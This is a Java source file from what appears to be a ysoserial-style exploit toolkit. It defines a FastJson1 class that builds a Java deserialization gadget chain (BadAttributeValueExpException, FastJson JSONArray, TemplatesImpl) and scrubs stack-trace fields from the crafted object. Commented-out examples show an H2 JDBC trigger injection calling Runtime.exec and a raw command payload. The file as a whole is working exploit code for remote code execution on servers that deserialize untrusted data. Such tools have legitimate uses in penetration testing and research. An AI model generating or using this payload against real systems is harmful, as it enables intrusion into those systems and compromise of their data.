package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Gadgets;
import cn.butler.yso.payloads.util.JavaVersion;
import cn.butler.yso.payloads.util.Reflections;
import com.alibaba.fastjson.JSONArray;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

/**
 *
 * javax.management.BadAttributeValueExpException#readObject
 *      com.alibaba.fastjson.JSON#toJSONString
 *          com.sun.org.apache.xalan.internal.trax.TemplatesImpl#getOutputProperties (JDK)
 *          org.apache.xalan.xsltc.trax.TemplatesImpl#getOutputProperties (xalan)
 *
 * Requires: FastJson
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.alibaba:fastjson:1.2.83"})
@Authors({Authors.B0T1ER})
public class FastJson1 extends PayloadRunner implements ObjectPayload<Object> {

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

    public static void main(String[] args) throws Exception {
//        String command = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
//            "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
//            "java.lang.Runtime.getRuntime().exec('calc')\n" +
//            "$$\n";
//        String payload = "JDBC:C3p0-H2:"+command;
//        args = new String[]{payload};
        //args = new String[]{"TemplatesImpl:raw_cmd:calc"};
        PayloadRunner.run(FastJson1.class, args);
    }

    public Object getObject(final String command) throws Exception {
        final Object object = Gadgets.createGetter(command);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(object);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);
        //清除堆栈信息
        Reflections.setFieldValue(badAttributeValueExpException,"stackTrace",new StackTraceElement[0]);
        Reflections.setFieldValue(badAttributeValueExpException,"cause",null);
        Reflections.setFieldValue(badAttributeValueExpException,"suppressedExceptions",null);

        HashMap hashMap = new HashMap();
        hashMap.put(object, badAttributeValueExpException);

        return hashMap;
    }
}
